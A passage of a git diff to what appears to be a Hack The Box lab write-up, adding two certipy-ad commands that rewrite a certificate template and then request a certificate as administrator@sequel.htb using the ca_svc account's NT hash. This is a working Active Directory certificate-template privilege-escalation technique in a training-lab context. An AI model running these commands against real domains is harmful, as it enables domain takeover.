@@ -99,8 +99,23 @@ We find 33 certificates, but we see that users in the CERT PUBLISHER group have 
 
 <img width="937" height="79" alt="image" src="https://github.com/user-attachments/assets/fd216993-e3cc-4a20-9e26-554ca22fd1a8" />
 
-``
-``
+`certipy-ad template -u ca_svc@sequel.htb \
+  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
+  -template DunderMifflinAuthentication \
+  -write-configuration DunderMifflinAuthentication.json`
+
+<img width="940" height="281" alt="image" src="https://github.com/user-attachments/assets/2e541235-2c77-45e3-82f4-a280ff502fc4" />
+
+
+`certipy-ad req -u ca_svc@sequel.htb \
+  -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
+  -ca sequel-DC01-CA \
+  -template DunderMifflinAuthentication \
+  -upn administrator@sequel.htb \
+  -target-ip 10.129.232.128`
+
+  <img width="713" height="281" alt="image" src="https://github.com/user-attachments/assets/8ca41e5c-14be-47d4-9853-225a3dcfb58d" />
+
 
 ``
 ``
